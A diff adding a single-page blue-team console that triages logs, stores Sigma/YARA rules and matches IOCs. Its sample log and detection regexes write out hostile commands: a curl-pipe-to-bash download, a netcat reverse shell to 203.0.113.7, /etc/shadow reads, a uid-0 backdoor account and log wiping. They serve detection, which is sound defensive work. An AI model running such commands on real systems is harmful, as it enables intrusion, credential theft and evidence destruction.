@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>MOTHER — BLUE DECK</title>
+<link rel="stylesheet" href="mother.css">
+<style>
+  /* ═══════════════════════════════════════════════════════════════
+     BLUE DECK · SYS.09 — defensive / blue-team workspace.
+     Module-specific CSS only. Shared theme via mother.css.
+     ═══════════════════════════════════════════════════════════════ */
+  .m-body.split-nav { grid-template-columns:190px 1fr; }
+  .pane--work { display:flex; flex-direction:column; min-height:0; }
+  .tool { display:none; flex-direction:column; min-height:0; height:100%; }
+  .tool.active { display:flex; }
+
+  .work-split { display:grid; grid-template-columns:1fr 1fr; min-height:0; flex:1; }
+  .work-col { display:flex; flex-direction:column; min-height:0; overflow:auto; }
+  .work-col + .work-col { border-left:1px solid var(--border); background:var(--bg-panel); }
+
+  textarea.blob { width:100%; height:100%; min-height:180px; flex:1; }
+  .results { flex:1; overflow:auto; padding:10px 12px; min-height:0; }
+
+  .find { border:1px solid var(--border-dim); background:var(--bg-panel); padding:8px 10px; margin-bottom:8px; }
+  .find__top { display:flex; align-items:center; gap:8px; margin-bottom:5px; }
+  .find__ln { font-size:8px; color:var(--phos-dim); letter-spacing:0.1em; white-space:nowrap; }
+  .find__line { font-size:11px; color:var(--phos-br); white-space:pre-wrap; word-break:break-all;
+    background:var(--bg-input); border:1px solid var(--border-dim); padding:5px 7px; }
+  .find__why { font-size:9px; color:var(--phos-dim); letter-spacing:0.05em; margin-top:5px; text-transform:uppercase; }
+
+  .find--MED { border-left:2px solid var(--amber); }
+  .find--HIGH { border-left:2px solid var(--alert); }
+  .find--CRIT { border-left:2px solid var(--alert); box-shadow:inset 0 0 12px rgba(255,68,51,0.12); }
+
+  .sev-bar { display:flex; gap:14px; padding:8px 12px; border-bottom:1px solid var(--border-dim); }
+  .sev-bar .s { font-size:9px; letter-spacing:0.1em; color:var(--phos-dim); text-transform:uppercase; }
+  .sev-bar .s b { font-size:14px; }
+  .sev-bar .s.med b { color:var(--amber); }
+  .sev-bar .s.high b { color:var(--alert); }
+  .sev-bar .s.crit b { color:var(--alert); text-shadow:0 0 6px rgba(255,68,51,0.6); }
+
+  .rule-card .rc-head { display:flex; align-items:center; gap:8px; margin-bottom:6px; }
+  .rule-card .rc-name { font-size:12px; color:var(--phos-br); letter-spacing:0.05em; flex:1; }
+  .rule-card .rc-src { font-size:9px; color:var(--phos-dim); letter-spacing:0.06em; margin-bottom:7px; text-transform:uppercase; }
+  .rule-card .code { max-height:200px; overflow:auto; }
+  .rc-actions { display:flex; gap:6px; margin-top:7px; }
+
+  .ioc-row { display:flex; align-items:center; gap:10px; padding:6px 10px; border-bottom:1px solid var(--border-dim); }
+  .ioc-row .ic-val { flex:1; font-size:11px; word-break:break-all; }
+  .ioc-row.match { background:rgba(255,68,51,0.08); border-left:2px solid var(--alert); }
+  .ioc-row.match .ic-val { color:var(--alert); }
+  .ioc-row.clean .ic-val { color:var(--phos-dim); }
+  .ioc-row .ic-src { font-size:9px; letter-spacing:0.06em; }
+
+  .wl-item { display:flex; align-items:center; gap:8px; padding:4px 10px; border-bottom:1px solid var(--border-dim); font-size:10px; }
+  .wl-item .wl-val { flex:1; color:var(--phos); word-break:break-all; }
+  .wl-item .wl-x { cursor:pointer; color:var(--phos-dim); border:1px solid var(--border-dim); padding:0 6px; }
+  .wl-item .wl-x:hover { color:var(--alert); border-color:var(--alert); }
+
+  .stackform { display:flex; flex-direction:column; gap:8px; }
+  .stackform textarea { min-height:150px; }
+  .inline-row { display:flex; gap:6px; }
+  .inline-row input { flex:1; }
+</style>
+</head>
+<body>
+  <header class="m-header">
+    <div class="m-brand">BLUE DECK<small>MOTHER · SYS.09 · DEFENSIVE OPS CONSOLE</small></div>
+    <div class="m-stats">
+      <div class="m-stat">Flagged<b id="s-flagged">0</b></div>
+      <div class="m-stat">MED<b id="s-med" class="amber">0</b></div>
+      <div class="m-stat">HIGH<b id="s-high" class="alert">0</b></div>
+      <div class="m-stat">CRIT<b id="s-crit" class="alert">0</b></div>
+      <div class="m-stat">Rules<b id="s-rules">0</b></div>
+      <div class="m-stat">IOC Hits<b id="s-iochits" class="alert">0</b></div>
+    </div>
+    <div class="m-haz"></div>
+    <div class="m-stat" style="text-align:right;">Clock<b id="s-clock" class="mono">--:--:--</b></div>
+  </header>
+
+  <div class="m-body split-nav">
+    <aside class="pane pane--nav">
+      <div class="navlist" id="nav">
+        <button class="navitem navitem--active" data-tool="triage">▤ LOG TRIAGE<span class="count" id="c-triage">0</span></button>
+        <button class="navitem" data-tool="detections">◈ DETECTIONS<span class="count" id="c-det">0</span></button>
+        <button class="navitem" data-tool="ioc">⚠ IOC MATCH<span class="count" id="c-ioc">0</span></button>
+      </div>
+      <div class="sec">
+        <div class="sec__title bracket">STATUS</div>
+        <div class="dim" style="font-size:9px; line-height:1.7; letter-spacing:0.08em;">
+          DECK · BLUE-TEAM<br>
+          MODE · MONITOR<br>
+          SIG.DB · LOCAL<br>
+          <span class="holo">READY</span>
+        </div>
+      </div>
+    </aside>
+
+    <section class="pane pane--work">
+
+      <!-- ── LOG TRIAGE ─────────────────────────────────────── -->
+      <div class="tool active" data-tool="triage">
+        <div class="work-split">
+          <div class="work-col">
+            <div class="sec">
+              <div class="sec__title bracket">PASTE LOG / ALERT BLOB</div>
+              <div class="stackform">
+                <textarea id="triage-in" class="blob" placeholder="Paste auth.log / syslog / EDR alert text here…"></textarea>
+                <div class="btn-row">
+                  <button class="btn btn--go" id="btn-analyze">▶ ANALYZE</button>
+                  <button class="btn btn--ghost" id="btn-triage-sample">SAMPLE</button>
+                  <button class="btn btn--ghost" id="btn-triage-clear">CLEAR</button>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="work-col">
+            <div class="sev-bar">
+              <div class="s med">MED<b id="t-med">0</b></div>
+              <div class="s high">HIGH<b id="t-high">0</b></div>
+              <div class="s crit">CRIT<b id="t-crit">0</b></div>
+              <div class="s" style="margin-left:auto;">LINES<b id="t-total" class="dim">0</b></div>
+            </div>
+            <div class="results" id="triage-out">
+              <div class="empty"><div class="icon">▤</div><div class="big">NO ANALYSIS</div>
+                <div class="dim" style="font-size:10px;">paste a blob → ANALYZE</div></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ── DETECTIONS ─────────────────────────────────────── -->
+      <div class="tool" data-tool="detections">
+        <div class="work-split">
+          <div class="work-col">
+            <div class="sec">
+              <div class="sec__title bracket" id="rule-form-title">NEW RULE</div>
+              <div class="stackform">
+                <div class="field"><label>Rule Name</label><input id="rule-name" placeholder="e.g. Suspicious PowerShell EncodedCommand"></div>
+                <div class="inline-row">
+                  <div class="field" style="flex:1;"><label>Type</label>
+                    <select id="rule-type"><option value="SIGMA">SIGMA</option><option value="YARA">YARA</option></select></div>
+                  <div class="field" style="flex:2;"><label>Logsource / Target</label><input id="rule-src" placeholder="e.g. windows/process_creation"></div>
+                </div>
+                <div class="field"><label>Rule Body</label><textarea id="rule-body" placeholder="Paste Sigma YAML or YARA rule…"></textarea></div>
+                <div class="btn-row">
+                  <button class="btn btn--go" id="btn-rule-save">▶ SAVE RULE</button>
+                  <button class="btn btn--ghost" id="btn-rule-reset">RESET</button>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="work-col">
+            <div class="sec" style="border-bottom:none;">
+              <div class="sec__title bracket">RULE NOTEBOOK</div>
+            </div>
+            <div class="results" id="rule-list" style="padding-top:0;"></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ── IOC MATCH ──────────────────────────────────────── -->
+      <div class="tool" data-tool="ioc">
+        <div class="work-split">
+          <div class="work-col">
+            <div class="sec">
+              <div class="sec__title bracket">PASTE TEXT → EXTRACT IOCs</div>
+              <div class="stackform">
+                <textarea id="ioc-in" class="blob" placeholder="Paste report / email / log text with IPs, domains, hashes…"></textarea>
+                <div class="btn-row">
+                  <button class="btn btn--go" id="btn-ioc-scan">▶ EXTRACT & MATCH</button>
+                  <button class="btn btn--ghost" id="btn-ioc-sample">SAMPLE</button>
+                  <button class="btn btn--ghost" id="btn-ioc-clear">CLEAR</button>
+                </div>
+              </div>
+            </div>
+            <div class="sec" style="flex:1; display:flex; flex-direction:column; min-height:0;">
+              <div class="sec__title bracket">KNOWN-BAD WATCHLIST</div>
+              <div class="inline-row" style="margin-bottom:7px;">
+                <input id="wl-add" placeholder="add IP / domain / hash">
+                <button class="btn btn--go" id="btn-wl-add">ADD</button>
+              </div>
+              <div id="wl-list" style="overflow:auto; min-height:0; flex:1;"></div>
+            </div>
+          </div>
+          <div class="work-col">
+            <div class="sev-bar">
+              <div class="s high">MATCHES<b id="ioc-hits">0</b></div>
+              <div class="s" style="margin-left:auto;">EXTRACTED<b id="ioc-count" class="dim">0</b></div>
+            </div>
+            <div class="results" id="ioc-out">
+              <div class="empty"><div class="icon">⚠</div><div class="big">NO IOCs</div>
+                <div class="dim" style="font-size:10px;">paste text → EXTRACT &amp; MATCH</div></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </section>
+  </div>
+
+  <script>
+  'use strict';
+  const $ = (id) => document.getElementById(id);
+  const LS = { rules:'mother.bluedeck.rules.v1', wl:'mother.bluedeck.watchlist.v1' };
+
+  function esc(s){ return String(s).replace(/[&<>"']/g, c =>
+    ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
+
+  /* ── Nav switching ──────────────────────────────────────────── */
+  document.querySelectorAll('.navitem').forEach(btn => {
+    btn.addEventListener('click', () => {
+      document.querySelectorAll('.navitem').forEach(b => b.classList.remove('navitem--active'));
+      btn.classList.add('navitem--active');
+      const t = btn.dataset.tool;
+      document.querySelectorAll('.tool').forEach(el =>
+        el.classList.toggle('active', el.dataset.tool === t));
+    });
+  });
+
+  /* ══════════════════════════════════════════════════════════════
+     LOG TRIAGE
+     ══════════════════════════════════════════════════════════════ */
+  // Ordered by precedence — first match wins per line.
+  const SIGS = [
+    { sev:'CRIT', why:'Netcat reverse-shell pattern',
+      re:/\b(?:nc|ncat)\b.{0,40}(?:-e\b|\s(?:\/bin\/)?(?:ba)?sh\b|mkfifo|-c\s)|(?:ba)?sh\s+-i\s+>&\s*\/dev\/tcp/i },
+    { sev:'CRIT', why:'Reverse shell via /dev/tcp',
+      re:/\/dev\/tcp\/\d{1,3}(?:\.\d{1,3}){3}\/\d+/i },
+    { sev:'HIGH', why:'Pipe-to-shell download execution',
+      re:/(?:wget|curl)\b[^\n]*\|\s*(?:sudo\s+)?(?:ba)?sh\b/i },
+    { sev:'HIGH', why:'Encoded PowerShell command',
+      re:/powershell(?:\.exe)?[^\n]*\s-(?:enc(?:odedcommand)?|e)\b|-EncodedCommand\b/i },
+    { sev:'HIGH', why:'Sensitive credential file access (passwd/shadow)',
+      re:/\/etc\/(?:passwd|shadow|sudoers)\b/i },
+    { sev:'HIGH', why:'New local user creation',
+      re:/\b(?:useradd|adduser|net\s+user\s+\/add|new-localuser)\b/i },
+    { sev:'HIGH', why:'Long base64 blob (possible encoded payload)',
+      re:/[A-Za-z0-9+/]{60,}={0,2}/ },
+    { sev:'MED', why:'Failed authentication / login',
+      re:/failed password|authentication failure|invalid user|failed login|login failed/i },
+    { sev:'MED', why:'Privilege escalation via sudo / su',
+      re:/\bsudo\b|\bsu\s+(?:root|-)\b|\bsu\s*$/i },
+    { sev:'MED', why:'Recursive force delete',
+      re:/\brm\s+-rf\b|\brm\s+-fr\b/i },
+  ];
+  const SEV_RANK = { MED:1, HIGH:2, CRIT:3 };
+  const SEV_TAG = { MED:'tag--amber', HIGH:'tag--alert', CRIT:'tag--alert' };
+
+  const TRIAGE_SAMPLE =
+`Jan 12 03:14:02 web01 sshd[2244]: Failed password for invalid user admin from 203.0.113.7 port 51044 ssh2
+Jan 12 03:14:05 web01 sshd[2244]: Failed password for root from 203.0.113.7 port 51044 ssh2
+Jan 12 03:14:09 web01 sshd[2251]: authentication failure; logname= uid=0 rhost=203.0.113.7
+Jan 12 03:15:40 web01 sudo:   www-data : TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Jan 12 03:15:44 web01 bash: curl http://203.0.113.7/x.sh | bash
+Jan 12 03:15:51 web01 bash: cat /etc/shadow
+Jan 12 03:16:02 web01 bash: useradd -M -o -u 0 -g 0 svc-backup
+Jan 12 03:16:20 web01 bash: nc -e /bin/sh 203.0.113.7 4444
+Jan 12 03:16:31 win-dc powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA
+Jan 12 03:17:00 web01 bash: rm -rf /var/log/*
+Jan 12 03:17:12 web01 CRON[3001]: (root) CMD (/usr/bin/backup.sh)`;
+
+  function triageAnalyze(text){
+    const lines = text.split('\n');
+    const out = []; const counts = { MED:0, HIGH:0, CRIT:0 };
+    lines.forEach((ln, i) => {
+      if (!ln.trim()) return;
+      for (const sig of SIGS){
+        if (sig.re.test(ln)){
+          out.push({ ln:i+1, line:ln, sev:sig.sev, why:sig.why });
+          counts[sig.sev]++;
+          break;
+        }
+      }
+    });
+    out.sort((a,b) => SEV_RANK[b.sev]-SEV_RANK[a.sev] || a.ln-b.ln);
+    return { out, counts, total:lines.filter(l=>l.trim()).length };
+  }
+
+  function renderTriage(res){
+    const el = $('triage-out');
+    $('t-med').textContent = res.counts.MED;
+    $('t-high').textContent = res.counts.HIGH;
+    $('t-crit').textContent = res.counts.CRIT;
+    $('t-total').textContent = res.total;
+    const flagged = res.out.length;
+    $('c-triage').textContent = flagged;
+    $('s-flagged').textContent = flagged;
+    $('s-med').textContent = res.counts.MED;
+    $('s-high').textContent = res.counts.HIGH;
+    $('s-crit').textContent = res.counts.CRIT;
+    if (!flagged){
+      el.innerHTML = '<div class="empty"><div class="icon">✓</div><div class="big" style="color:var(--ok)">NO THREATS FLAGGED</div>'
+        + '<div class="dim" style="font-size:10px;">'+res.total+' lines scanned · clean</div></div>';
+      return;
+    }
+    el.innerHTML = res.out.map(f =>
+      `<div class="find find--${f.sev}">
+         <div class="find__top">
+           <span class="tag ${SEV_TAG[f.sev]}">${f.sev}</span>
+           <span class="find__ln">LINE ${f.ln}</span>
+         </div>
+         <div class="find__line">${esc(f.line)}</div>
+         <div class="find__why">↳ ${esc(f.why)}</div>
+       </div>`).join('');
+  }
+
+  $('btn-analyze').addEventListener('click', () => renderTriage(triageAnalyze($('triage-in').value)));
+  $('btn-triage-sample').addEventListener('click', () => { $('triage-in').value = TRIAGE_SAMPLE; renderTriage(triageAnalyze(TRIAGE_SAMPLE)); });
+  $('btn-triage-clear').addEventListener('click', () => { $('triage-in').value=''; renderTriage({out:[],counts:{MED:0,HIGH:0,CRIT:0},total:0}); });
+
+  /* ══════════════════════════════════════════════════════════════
+     DETECTIONS — Sigma / YARA notebook
+     ══════════════════════════════════════════════════════════════ */
+  const SEED_RULES = [
+    { id:'r-001', name:'Suspicious PowerShell EncodedCommand', type:'SIGMA', src:'windows/process_creation',
+      body:`title: Suspicious PowerShell EncodedCommand
+id: 9a1f5c22-encoded-ps-001
+status: stable
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection:
+    Image|endswith: '\\powershell.exe'
+    CommandLine|contains:
+      - ' -enc '
+      - ' -EncodedCommand '
+      - ' -e JAB'
+  condition: selection
+level: high
+tags:
+  - attack.execution
+  - attack.t1059.001` },
+    { id:'r-002', name:'Linux Reverse Shell via /dev/tcp', type:'SIGMA', src:'linux/process_creation',
+      body:`title: Linux Reverse Shell via /dev/tcp
+id: 3b7e0d10-revshell-devtcp-002
+status: experimental
+logsource:
+  product: linux
+  category: process_creation
+detection:
+  selection:
+    CommandLine|contains:
+      - '/dev/tcp/'
+      - 'sh -i >&'
+      - 'bash -i >&'
+  condition: selection
+level: critical
+tags:
+  - attack.execution
+  - attack.t1059.004` },
+    { id:'r-003', name:'Generic PHP Webshell (eval $_POST)', type:'YARA', src:'files: *.php',
+      body:`rule Generic_PHP_Webshell
+{
+    meta:
+        author = "blue-deck"
+        description = "Detects generic eval() PHP webshells"
+        severity = "high"
+    strings:
+        $php   = "<?php"
+        $eval1 = "eval($_POST" nocase
+        $eval2 = "eval($_GET" nocase
+        $eval3 = "assert($_REQUEST" nocase
+        $b64   = "base64_decode(" nocase
+    condition:
+        $php and ( any of ($eval*) or ($b64 and filesize < 50KB) )
+}` },
+  ];
+
+  let rules = loadRules();
+  let editingId = null;
+
+  function loadRules(){
+    try { const r = JSON.parse(localStorage.getItem(LS.rules)); if (Array.isArray(r)) return r; }
+    catch(e){}
+    localStorage.setItem(LS.rules, JSON.stringify(SEED_RULES));
+    return SEED_RULES.slice();
+  }
+  function saveRules(){ localStorage.setItem(LS.rules, JSON.stringify(rules)); }
+
+  function renderRules(){
+    const el = $('rule-list');
+    $('c-det').textContent = rules.length;
+    $('s-rules').textContent = rules.length;
+    if (!rules.length){
+      el.innerHTML = '<div class="empty"><div class="icon">◈</div><div class="big">NO RULES</div></div>';
+      return;
+    }
+    el.innerHTML = rules.map(r => {
+      const tagCls = r.type === 'YARA' ? 'tag--holo' : 'tag--amber';
+      return `<div class="card rule-card" data-id="${r.id}">
+        <div class="rc-head">
+          <span class="rc-name">${esc(r.name)}</span>
+          <span class="tag ${tagCls}">${esc(r.type)}</span>
+        </div>
+        <div class="rc-src">↳ ${esc(r.src||'—')}</div>
+        <div class="code">${esc(r.body)}</div>
+        <div class="rc-actions">
+          <button class="copy-btn" data-act="copy">⧉ COPY</button>
+          <button class="copy-btn" data-act="edit">✎ EDIT</button>
+          <button class="copy-btn" data-act="del" style="color:var(--alert);border-color:rgba(255,68,51,0.4);">✕ DEL</button>
+        </div>
+      </div>`;
+    }).join('');
+    el.querySelectorAll('.rule-card').forEach(card => {
+      const id = card.dataset.id;
+      card.querySelector('[data-act="copy"]').addEventListener('click', (e) => {
+        const r = rules.find(x => x.id === id);
+        navigator.clipboard && navigator.clipboard.writeText(r.body);
+        e.target.textContent = '✓ COPIED'; setTimeout(() => e.target.textContent = '⧉ COPY', 1200);
+      });
+      card.querySelector('[data-act="edit"]').addEventListener('click', () => editRule(id));
+      card.querySelector('[data-act="del"]').addEventListener('click', () => {
+        rules = rules.filter(x => x.id !== id); saveRules(); renderRules();
+        if (editingId === id) resetRuleForm();
+      });
+    });
+  }
+
+  function editRule(id){
+    const r = rules.find(x => x.id === id); if (!r) return;
+    editingId = id;
+    $('rule-name').value = r.name; $('rule-type').value = r.type;
+    $('rule-src').value = r.src; $('rule-body').value = r.body;
+    $('rule-form-title').textContent = 'EDIT RULE';
+    $('btn-rule-save').textContent = '▶ UPDATE RULE';
+  }
+  function resetRuleForm(){
+    editingId = null;
+    $('rule-name').value=''; $('rule-type').value='SIGMA'; $('rule-src').value=''; $('rule-body').value='';
+    $('rule-form-title').textContent = 'NEW RULE';
+    $('btn-rule-save').textContent = '▶ SAVE RULE';
+  }
+
+  let ruleSeq = 100;
+  function nextRuleId(){ ruleSeq++; return 'r-u' + ruleSeq; }
+
+  $('btn-rule-save').addEventListener('click', () => {
+    const name = $('rule-name').value.trim();
+    const body = $('rule-body').value.trim();
+    if (!name || !body){ $('rule-name').focus(); return; }
+    const rec = { name, type:$('rule-type').value, src:$('rule-src').value.trim(), body };
+    if (editingId){
+      const i = rules.findIndex(x => x.id === editingId);
+      if (i >= 0) rules[i] = { id:editingId, ...rec };
+    } else {
+      rules.unshift({ id:nextRuleId(), ...rec });
+    }
+    saveRules(); renderRules(); resetRuleForm();
+  });
+  $('btn-rule-reset').addEventListener('click', resetRuleForm);
+
+  /* ══════════════════════════════════════════════════════════════
+     IOC MATCH
+     ══════════════════════════════════════════════════════════════ */
+  const SEED_WATCHLIST = [
+    { type:'ip',     val:'203.0.113.7',  src:'C2 · cobalt-cluster' },
+    { type:'ip',     val:'45.155.205.233', src:'SSH bruteforce swarm' },
+    { type:'domain', val:'update-checkin.net', src:'malware C2 domain' },
+    { type:'domain', val:'cdn-analytics-cache.com', src:'exfil staging' },
+    { type:'md5',    val:'44d88612fea8a8f36de82e1278abb02f', src:'EICAR test signature' },
+    { type:'sha256', val:'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', src:'known-bad dropper' },
+  ];
+
+  let watchlist = loadWatchlist();
+  function loadWatchlist(){
+    try { const w = JSON.parse(localStorage.getItem(LS.wl)); if (Array.isArray(w)) return w; }
+    catch(e){}
+    localStorage.setItem(LS.wl, JSON.stringify(SEED_WATCHLIST));
+    return SEED_WATCHLIST.slice();
+  }
+  function saveWatchlist(){ localStorage.setItem(LS.wl, JSON.stringify(watchlist)); }
+
+  const IOC_SAMPLE =
+`Incident note — beaconing observed from 10.0.0.30 to 203.0.113.7 every 60s.
+DNS lookups for update-checkin.net and safe-cdn.example.org resolved.
+Dropped file hash (md5): 44d88612fea8a8f36de82e1278abb02f
+Second-stage payload sha256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+Contacted host 8.8.8.8 for DNS. Also saw cdn-analytics-cache.com in TLS SNI.
+Benign asset server: assets.internal.lan (192.168.1.20).`;
+
+  const RE_IP = /\b(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)\b/g;
+  const RE_SHA256 = /\b[a-f0-9]{64}\b/gi;
+  const RE_MD5 = /\b[a-f0-9]{32}\b/gi;
+  const RE_DOMAIN = /\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:com|net|org|io|co|info|biz|ru|cn|xyz|top|lan|studio|dev|example)\b/gi;
+
+  function extractIocs(text){
+    const seen = new Set(); const iocs = [];
+    const push = (type, raw) => { const v = raw.toLowerCase(); const k = type+':'+v;
+      if (seen.has(k)) return; seen.add(k); iocs.push({ type, val:raw }); };
+    (text.match(RE_SHA256) || []).forEach(h => push('sha256', h));
+    // strip sha256 before md5 so 64-char hashes don't yield stray 32-char matches
+    const noSha = text.replace(RE_SHA256, ' ');
+    (noSha.match(RE_MD5) || []).forEach(h => push('md5', h));
+    (text.match(RE_IP) || []).forEach(ip => push('ip', ip));
+    (text.match(RE_DOMAIN) || []).forEach(d => push('domain', d));
+    return iocs;
+  }
+
+  function iocMatch(ioc){
+    const v = ioc.val.toLowerCase();
+    return watchlist.find(w => w.val.toLowerCase() === v &&
+      (w.type === ioc.type || (w.type==='ip'&&ioc.type==='ip')));
+  }
+
+  const IOC_TYPE_TAG = { ip:'tag--holo', domain:'tag--amber', md5:'tag', sha256:'tag' };
+
+  function scanIocs(text){
+    const iocs = extractIocs(text);
+    let hits = 0;
+    const rows = iocs.map(ioc => {
+      const hit = iocMatch(ioc);
+      if (hit) hits++;
+      return `<div class="ioc-row ${hit?'match':'clean'}">
+        <span class="tag ${IOC_TYPE_TAG[ioc.type]||'tag'}">${ioc.type.toUpperCase()}</span>
+        <span class="ic-val">${esc(ioc.val)}</span>
+        <span class="ic-src ${hit?'alert':'dim'}">${hit?'⚠ MATCH — '+esc(hit.src):'no match'}</span>
+      </div>`;
+    });
+    const el = $('ioc-out');
+    $('ioc-hits').textContent = hits;
+    $('ioc-count').textContent = iocs.length;
+    $('c-ioc').textContent = hits;
+    $('s-iochits').textContent = hits;
+    if (!iocs.length){
+      el.innerHTML = '<div class="empty"><div class="icon">⚠</div><div class="big">NO IOCs FOUND</div></div>';
+      return;
+    }
+    el.innerHTML = rows.join('');
+  }
+
+  function renderWatchlist(){
+    const el = $('wl-list');
+    el.innerHTML = watchlist.map((w,i) =>
+      `<div class="wl-item">
+        <span class="tag ${IOC_TYPE_TAG[w.type]||'tag'}">${w.type.toUpperCase()}</span>
+        <span class="wl-val">${esc(w.val)}</span>
+        <span class="wl-x" data-i="${i}">✕</span>
+      </div>`).join('');
+    el.querySelectorAll('.wl-x').forEach(x => x.addEventListener('click', () => {
+      watchlist.splice(+x.dataset.i, 1); saveWatchlist(); renderWatchlist();
+    }));
+  }
+
+  function classifyIoc(raw){
+    const v = raw.trim();
+    if (RE_SHA256.test(v)) { RE_SHA256.lastIndex=0; return 'sha256'; }
+    RE_SHA256.lastIndex=0;
+    if (/^[a-f0-9]{32}$/i.test(v)) return 'md5';
+    if (/^(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)$/.test(v)) return 'ip';
+    return 'domain';
+  }
+
+  $('btn-wl-add').addEventListener('click', () => {
+    const raw = $('wl-add').value.trim(); if (!raw) return;
+    watchlist.push({ type:classifyIoc(raw), val:raw, src:'user-added' });
+    saveWatchlist(); renderWatchlist(); $('wl-add').value='';
+  });
+  $('wl-add').addEventListener('keydown', e => { if (e.key==='Enter') $('btn-wl-add').click(); });
+
+  $('btn-ioc-scan').addEventListener('click', () => scanIocs($('ioc-in').value));
+  $('btn-ioc-sample').addEventListener('click', () => { $('ioc-in').value = IOC_SAMPLE; scanIocs(IOC_SAMPLE); });
+  $('btn-ioc-clear').addEventListener('click', () => { $('ioc-in').value=''; scanIocs(''); });
+
+  /* ── Live clock (display only) ──────────────────────────────── */
+  function tick(){
+    const d = new Date();
+    const p = n => String(n).padStart(2,'0');
+    $('s-clock').textContent = `${p(d.getHours())}:${p(d.getMinutes())}:${p(d.getSeconds())}`;
+  }
+  setInterval(tick, 1000); tick();
+
+  /* ── Boot ───────────────────────────────────────────────────── */
+  renderRules();
+  renderWatchlist();
+  renderTriage(triageAnalyze(TRIAGE_SAMPLE));
+  $('triage-in').value = TRIAGE_SAMPLE;
+  </script>
+</body>
+</html>
